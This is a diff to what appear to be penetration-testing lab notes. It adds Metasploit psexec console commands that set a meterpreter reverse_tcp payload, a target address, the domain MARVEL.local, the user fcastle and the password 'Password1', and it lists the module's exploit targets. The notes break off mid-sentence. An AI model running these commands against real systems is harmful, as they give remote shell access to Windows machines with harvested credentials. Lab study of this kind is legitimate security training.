@@ -67,5 +67,30 @@ msf6 exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/reverse_t
 payload => windows/x64/meterpreter/reverse_tcp
 ```
 
+```shell
+msf6 exploit(windows/smb/psexec) > set rhosts 192.168.0.166
+rhosts => 192.168.0.166
+msf6 exploit(windows/smb/psexec) > set smbdomain MARVEL.local
+smbdomain => MARVEL.local
+msf6 exploit(windows/smb/psexec) > set smbuser fcastle
+smbuser => fcastle
+msf6 exploit(windows/smb/psexec) > set smbpass Password1
+smbpass => Password1
+```
 
+```shell
+msf6 exploit(windows/smb/psexec) > show targets
 
+Exploit targets:
+=================
+
+    Id  Name
+    --  ----
+=>  0   Automatic
+    1   PowerShell
+    2   Native upload
+    3   MOF upload
+    4   Command
+```
+
+It is better 
